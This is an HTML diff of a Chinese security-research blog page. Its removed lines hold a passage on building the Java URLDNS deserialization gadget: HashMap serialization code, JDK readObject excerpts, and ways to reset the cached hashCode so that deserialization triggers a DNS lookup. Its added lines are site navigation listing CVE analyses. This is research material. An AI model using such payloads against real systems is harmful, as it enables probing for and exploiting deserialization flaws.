-</span></span><span style=display:flex><span>        map.<span style=color:#a6e22e>put</span>(u1,<span style=color:#e6db74>&#34;1&#34;</span>);
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>        FileOutputStream fos <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileOutputStream(<span style=color:#e6db74>&#34;object&#34;</span>);
-</span></span><span style=display:flex><span>        ObjectOutputStream os <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream(fos);
-</span></span><span style=display:flex><span>        <span style=color:#75715e>//writeObject()方法将myObj对象写入object文件</span>
-</span></span><span style=display:flex><span>        os.<span style=color:#a6e22e>writeObject</span>(map);
-</span></span><span style=display:flex><span>        os.<span style=color:#a6e22e>close</span>();
-</span></span><span style=display:flex><span>        <span style=color:#75715e>//从文件中反序列化obj对象</span>
-</span></span><span style=display:flex><span>        FileInputStream fis <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> FileInputStream(<span style=color:#e6db74>&#34;object&#34;</span>);
-</span></span><span style=display:flex><span>        ObjectInputStream ois <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectInputStream(fis);
-</span></span><span style=display:flex><span>        <span style=color:#75715e>//恢复对象</span>
-</span></span><span style=display:flex><span>        HashMap map2 <span style=color:#f92672>=</span> (HashMap<span style=color:#f92672>&lt;</span>URL,String<span style=color:#f92672>&gt;</span>)ois.<span style=color:#a6e22e>readObject</span>();
-</span></span><span style=display:flex><span>        System.<span style=color:#a6e22e>out</span>.<span style=color:#a6e22e>println</span>(<span style=color:#e6db74>&#34;finish&#34;</span>);
-</span></span><span style=display:flex><span>        ois.<span style=color:#a6e22e>close</span>();
-</span></span><span style=display:flex><span>    }
-</span></span><span style=display:flex><span>}
-</span></span></code></pre></div><p>实际测试在从文件中反序列化恢复HashMap对象时不会触发DNS查询，跟进HashMap的readObject，有如下</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>            <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> 0; i <span style=color:#f92672>&lt;</span> mappings; i<span style=color:#f92672>++</span>) {
-</span></span><span style=display:flex><span>                <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;unchecked&#34;</span>)
-</span></span><span style=display:flex><span>                    K key <span style=color:#f92672>=</span> (K) s.<span style=color:#a6e22e>readObject</span>();
-</span></span><span style=display:flex><span>                <span style=color:#a6e22e>@SuppressWarnings</span>(<span style=color:#e6db74>&#34;unchecked&#34;</span>)
-</span></span><span style=display:flex><span>                    V value <span style=color:#f92672>=</span> (V) s.<span style=color:#a6e22e>readObject</span>();
-</span></span><span style=display:flex><span>                putVal(hash(key), key, value, <span style=color:#66d9ef>false</span>, <span style=color:#66d9ef>false</span>);
-</span></span><span style=display:flex><span>            }
-</span></span></code></pre></div><p>其中对K尝试调用readObject方法反序列化出对应的对象，其会调用到URL类的readObject方法，可以看到URL的readObject方法会尝试读取到hashCode并放入对象的hashCode属性</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>private</span> <span style=color:#66d9ef>synchronized</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>readObject</span>(java.<span style=color:#a6e22e>io</span>.<span style=color:#a6e22e>ObjectInputStream</span> s)
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throws</span> IOException, ClassNotFoundException {
-</span></span><span style=display:flex><span>        GetField gf <span style=color:#f92672>=</span> s.<span style=color:#a6e22e>readFields</span>();
-</span></span><span style=display:flex><span>        String protocol <span style=color:#f92672>=</span> (String)gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;protocol&#34;</span>, <span style=color:#66d9ef>null</span>);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (getURLStreamHandler(protocol) <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> IOException(<span style=color:#e6db74>&#34;unknown protocol: &#34;</span> <span style=color:#f92672>+</span> protocol);
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        String host <span style=color:#f92672>=</span> (String)gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;host&#34;</span>, <span style=color:#66d9ef>null</span>);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> port <span style=color:#f92672>=</span> gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;port&#34;</span>, <span style=color:#f92672>-</span>1);
-</span></span><span style=display:flex><span>        String authority <span style=color:#f92672>=</span> (String)gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;authority&#34;</span>, <span style=color:#66d9ef>null</span>);
-</span></span><span style=display:flex><span>        String file <span style=color:#f92672>=</span> (String)gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;file&#34;</span>, <span style=color:#66d9ef>null</span>);
-</span></span><span style=display:flex><span>        String ref <span style=color:#f92672>=</span> (String)gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;ref&#34;</span>, <span style=color:#66d9ef>null</span>);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>int</span> hashCode <span style=color:#f92672>=</span> gf.<span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#34;hashCode&#34;</span>, <span style=color:#f92672>-</span>1);
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (authority <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>
-</span></span><span style=display:flex><span>                <span style=color:#f92672>&amp;&amp;</span> ((host <span style=color:#f92672>!=</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span>host.<span style=color:#a6e22e>isEmpty</span>()) <span style=color:#f92672>||</span> port <span style=color:#f92672>!=</span> <span style=color:#f92672>-</span>1)) {
-</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (host <span style=color:#f92672>==</span> <span style=color:#66d9ef>null</span>)
-</span></span><span style=display:flex><span>                host <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&#34;</span>;
-</span></span><span style=display:flex><span>            authority <span style=color:#f92672>=</span> (port <span style=color:#f92672>==</span> <span style=color:#f92672>-</span>1) <span style=color:#f92672>?</span> host : host <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;:&#34;</span> <span style=color:#f92672>+</span> port;
-</span></span><span style=display:flex><span>        }
-</span></span><span style=display:flex><span>        tempState <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> UrlDeserializedState(protocol, host, port, authority,
-</span></span><span style=display:flex><span>               file, ref, hashCode);
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>而在序列化时，会调用HashMap.put方法，put方法会跟前面一样，调用hash方法计算hashCode，并放到对象内，序列化时hashCode就被保存了。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span>    <span style=color:#66d9ef>public</span> V <span style=color:#a6e22e>put</span>(K key, V value) {
-</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> putVal(hash(key), key, value, <span style=color:#66d9ef>false</span>, <span style=color:#66d9ef>true</span>);
-</span></span><span style=display:flex><span>    }
-</span></span></code></pre></div><p>使得在调用URL.readObject方法时能够获取到hashCode，不会进行DNS解析。要解决这个问题就得让序列化后的数据hashCode为-1才能让hashCode方法调用到getHostAddress方法。
-容易想到两种办法</p><ol><li>在put后，修改数据，把hashCode对应的数据置为-1，而后进行序列化</li><li>在数据放入HashMap时，通过反射直接调用putVal并把第一个参数设为-1
+<span data-search-clear><i class="fas fa-times"></i></span>
+</div>
+<script type=text/javascript src=/js/lunr.min.js?1706695571></script>
+<script type=text/javascript src=/js/auto-complete.js?1706695571></script>
+<script type=text/javascript>var baseurl="https://www.ch35tnut.site/zh-cn"</script>
+<script type=text/javascript src=/js/search.js?1706695571></script>
+</div>
+<section id=homelinks>
+<ul>
+<li>
+<a class=padding href=/zh-cn><i class="fas fa-home"></i> 首页</a>
+</li>
+</ul>
+</section>
+<div class=highlightable>
+<ul class=topics>
+<li data-nav-id=/zh-cn/research/ title=安全研究 class="dd-item
+parent">
+<a href=/zh-cn/research/>
+<b>X. </b>安全研究
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/iot/ title=Iot class=dd-item>
+<a href=/zh-cn/research/iot/>
+<b>X. </b>Iot
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/linux/ title=Linux class=dd-item>
+<a href=/zh-cn/research/linux/>
+<b>X. </b>Linux
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/linux/malware/ title=Malware class=dd-item>
+<a href=/zh-cn/research/linux/malware/>
+<b>X. </b>Malware
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/linux/suid/ title=Suid class=dd-item>
+<a href=/zh-cn/research/linux/suid/>
+Suid
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/windows/ title=Windows class=dd-item>
+<a href=/zh-cn/research/windows/>
+<b>X. </b>Windows
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/windows/dll-inject/ title=Dll注入 class=dd-item>
+<a href=/zh-cn/research/windows/dll-inject/>
+<b>X. </b>Dll注入
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/windows/pe/ title=Pe class=dd-item>
+<a href=/zh-cn/research/windows/pe/>
+<b>X. </b>Pe
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/protocol/ title=协议 class=dd-item>
+<a href=/zh-cn/research/protocol/>
+<b>X. </b>协议
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/protocol/ntlm/ title="NTLM 协议" class=dd-item>
+<a href=/zh-cn/research/protocol/ntlm/>
+<b>X. </b>NTLM 协议
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/protocol/kerberos/ title="Kerberos 协议" class=dd-item>
+<a href=/zh-cn/research/protocol/kerberos/>
+<b>X. </b>Kerberos 协议
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/protocol/kerberos/kerberos-in-windows/ title=Windows中的kerberos协议 class=dd-item>
+<a href=/zh-cn/research/protocol/kerberos/kerberos-in-windows/>
+<b>X. </b>Windows中的kerberos协议
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/ title=认证原理 class=dd-item>
+<a href=/zh-cn/research/protocol/kerberos/authentication-principle.zh.cn/>
+认证原理
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/protocol/netlogon/ title=Netlogon class=dd-item>
+<a href=/zh-cn/research/protocol/netlogon/>
+Netlogon
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/web/ title=Web class="dd-item
+parent">
+<a href=/zh-cn/research/web/>
+<b>X. </b>Web
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/web/java-deserialization/ title="Java Deserialization" class="dd-item
+parent">
+<a href=/zh-cn/research/web/java-deserialization/>
+<b>X. </b>Java Deserialization
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/ title="CommonsBeanutils1 Chain" class=dd-item>
+<a href=/zh-cn/research/web/java-deserialization/commonsbeanutils1-chain/>
+CommonsBeanutils1 Chain
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/web/java-deserialization/urldns/ title="JAVA URL DNS 研究" class="dd-item active">
+<a href=/zh-cn/research/web/java-deserialization/urldns/>
+JAVA URL DNS 研究
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/web/php-filter-rce/ title="PHP Filter RCE 分析" class=dd-item>
+<a href=/zh-cn/research/web/php-filter-rce/>
+PHP Filter RCE 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/research/code-audit/ title=代码审计 class=dd-item>
+<a href=/zh-cn/research/code-audit/>
+<b>X. </b>代码审计
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/research/code-audit/codeql/ title=Codeql class=dd-item>
+<a href=/zh-cn/research/code-audit/codeql/>
+<b>X. </b>Codeql
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/code-audit/wireshark-185/ title="Wireshark 1.8.5代码审计" class=dd-item>
+<a href=/zh-cn/research/code-audit/wireshark-185/>
+Wireshark 1.8.5代码审计
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/research/code-audit/news-server/ title="News Server审计" class=dd-item>
+<a href=/zh-cn/research/code-audit/news-server/>
+News Server审计
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/ title=漏洞分析 class=dd-item>
+<a href=/zh-cn/vulnerability/>
+<b>X. </b>漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/ title="Windows CLFS EoP" class=dd-item>
+<a href=/zh-cn/vulnerability/windows-clfs-eop/>
+<b>X. </b>Windows CLFS EoP
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/ title=CVE-2023-28252 class=dd-item>
+<a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2023-28252/>
+CVE-2023-28252
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/ title=CVE-2022-37969 class=dd-item>
+<a href=/zh-cn/vulnerability/windows-clfs-eop/cve-2022-37969/>
+CVE-2022-37969
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/ title="CVE-2023-7028 GitLab Account Takeover" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-7028-gitlab-account-takeover/>
+CVE-2023-7028 GitLab Account Takeover
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/ title="CVE-2016-4437 Shiro 550 RCE 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2016-4437-shiro-550-rce/>
+CVE-2016-4437 Shiro 550 RCE 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/ title="CVE 2023 6553 Wordpress Backup Migration Plugin RCE" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-6553-wordpress-backup-migration-plugin-rce/>
+CVE 2023 6553 Wordpress Backup Migration Plugin RCE
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/ title="CVE-2023-50164 Apache Struts RCE分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-50164-apache-struts-rce/>
+CVE-2023-50164 Apache Struts RCE分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/ title="CVE-2023-21746 Windows NTLM Privilege Escalation" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-21746-windows-ntlm-privilege-escalation/>
+CVE-2023-21746 Windows NTLM Privilege Escalation
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/ title="CVE-2020-17530 Apache Struts OGNL RCE分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2020-17530-apache-struts-ognl-rce/>
+CVE-2020-17530 Apache Struts OGNL RCE分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/ title="CVE-2021-4034 Polkit 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2021-4034-polkit-eop/>
+CVE-2021-4034 Polkit 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/ title="CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-36036-windows-cloud-files-mini-filter-driver-eop/>
+CVE-2023-36036 Windows Cloud Files Mini Filter Driver 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2022-23121-afp-rce/ title="CVE-2022-23121 AFP RCE 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2022-23121-afp-rce/>
+CVE-2022-23121 AFP RCE 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/ title="CVE-2023-36563 Wordpad Info Disclosure 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/>
+CVE-2023-36563 Wordpad Info Disclosure 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/squid-dos/ title="Squid 拒绝服务漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/squid-dos/>
+Squid 拒绝服务漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/ title="CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-4966-citrix-gateway-info-disclosure/>
+CVE-2023-4966 Citrix Gateway 信息泄露漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/ title="CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-44487-http2-rapid-reset-ddos-attack/>
+CVE-2023-44487 Http2 Rapid Reset DDOS Attack 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/ title="CVE-2023-38545 Curl 堆溢出漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-38545-curl-heap-overflow/>
+CVE-2023-38545 Curl 堆溢出漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/ title="CVE-2023-4863 Libwebp Rce 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-4863-libwebp-rce/>
+CVE-2023-4863 Libwebp Rce 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/ title="CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-42820-jumpserver-pwd-reset-vuln/>
+CVE-2023-42820 Jumpserver 任意用户密码重置漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/ title="瑞友天翼 Rce分析" class=dd-item>
+<a href=/zh-cn/vulnerability/%E7%91%9E%E5%8F%8B%E5%A4%A9%E7%BF%BC-rce/>
+瑞友天翼 Rce分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/ title="CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-36874-windows-error-reporting-service-eop/>
+CVE-2023-36874 Windows Error Reporting Service 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/ title="CVE-2023-38148 Windows Ics Rce分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-38148-windows-ics-rce/>
+CVE-2023-38148 Windows Ics Rce分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/ title="CVE-2023-3519 Cirtix Gateway RCE分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-3519-cirtix-gateway-rce/>
+CVE-2023-3519 Cirtix Gateway RCE分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/ title="CVE-2023-32315 Openfire 身份认证绕过漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-32315-openfire-auth-bypass/>
+CVE-2023-32315 Openfire 身份认证绕过漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/smartbi-rce/ title="Smartbi RCE 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/smartbi-rce/>
+Smartbi RCE 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/ title="CVE-2023-2825 Gitlab 路径穿越漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-2825-gitlab-path-traversal/>
+CVE-2023-2825 Gitlab 路径穿越漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/zero-logon/ title="Zero Logon 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/zero-logon/>
+Zero Logon 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/ title="CVE-2022-4223 PgAdmin RCE 分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2022-4223-pgadmin-rce/>
+CVE-2022-4223 PgAdmin RCE 分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/strapi-rce/ title="Strapi RCE 漏洞链分析" class=dd-item>
+<a href=/zh-cn/vulnerability/strapi-rce/>
+Strapi RCE 漏洞链分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/ title="CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-23410-windows-http-sys-eop/>
+CVE-2023-23410 Windows HTTP.sys 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/ title="CVE-2021-3156 Sudo 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2021-3156-sudo-eop/>
+CVE-2021-3156 Sudo 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/ title="CVE-2023-28432 MinIO 信息泄露漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-28432-minio-information-disclosure/>
+CVE-2023-28432 MinIO 信息泄露漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/ title="CVE-2023-23397 Outlook 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2023-23397-outlook-eop/>
+CVE-2023-23397 Outlook 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/proxy-not-shell/ title="Proxy Not Shell 利用链分析" class=dd-item>
+<a href=/zh-cn/vulnerability/proxy-not-shell/>
+Proxy Not Shell 利用链分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/ title="CVE-2021-40449 Win32k 权限提升漏洞分析" class=dd-item>
+<a href=/zh-cn/vulnerability/cve-2021-40449-win32k-eop/>
+CVE-2021-40449 Win32k 权限提升漏洞分析
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/dailylife/ title=生活随笔 class=dd-item>
+<a href=/zh-cn/dailylife/>
+<b>X. </b>生活随笔
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/dailylife/movies/ title=Movies class=dd-item>
+<a href=/zh-cn/dailylife/movies/>
+<b>X. </b>Movies
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/dailylife/movies/2024-%E6%BD%9C%E8%A1%8C/ title="2024 潜行" class=dd-item>
+<a href=/zh-cn/dailylife/movies/2024-%E6%BD%9C%E8%A1%8C/>
+2024 潜行
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/dailylife/%E5%90%90%E6%A7%BD/ title=吐槽 class=dd-item>
+<a href=/zh-cn/dailylife/%E5%90%90%E6%A7%BD/>
+吐槽
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/dailylife/2023-review-and-2024-outlook/ title=2023年总结和2024年展望 class=dd-item>
+<a href=/zh-cn/dailylife/2023-review-and-2024-outlook/>
+2023年总结和2024年展望
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/misc/ title=杂项 class=dd-item>
+<a href=/zh-cn/misc/>
+<b>X. </b>杂项
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/tools/ title=Tools class=dd-item>
+<a href=/zh-cn/misc/tools/>
+<b>X. </b>Tools
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/tools/citrix-update-monitor/ title="【工具】Citrix NetScaler 更新监控" class=dd-item>
+<a href=/zh-cn/misc/tools/citrix-update-monitor/>
+【工具】Citrix NetScaler 更新监控
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/misc/encoding/ title=Encoding class=dd-item>
+<a href=/zh-cn/misc/encoding/>
+<b>X. </b>Encoding
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/encoding/utf-7/ title="Utf 7" class=dd-item>
+<a href=/zh-cn/misc/encoding/utf-7/>
+Utf 7
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+<li data-nav-id=/zh-cn/misc/encoding/unicode/ title=Unicode class=dd-item>
+<a href=/zh-cn/misc/encoding/unicode/>
+Unicode
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/misc/tunnel/ title=隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/>
+<b>X. </b>隧道
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/tunnel/application-layer/ title=应用层隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/application-layer/>
+<b>X. </b>应用层隧道
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/ title=SSH隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/application-layer/ssh-tunnel/>
+SSH隧道
+<i class="fas fa-check read-icon"></i>
+</a>
+</li>
+</ul>
+</li>
+<li data-nav-id=/zh-cn/misc/tunnel/transport-layer/ title=传输层隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/transport-layer/>
+<b>X. </b>传输层隧道
+<i class="fas fa-check read-icon"></i>
+</a>
+<ul>
+<li data-nav-id=/zh-cn/misc/tunnel/transport-layer/socks/ title=Socks隧道 class=dd-item>
+<a href=/zh-cn/misc/tunnel/transport-layer/socks/>
+<b>X. </b>Socks隧道
+<i class="fas fa-check read-icon"></i>
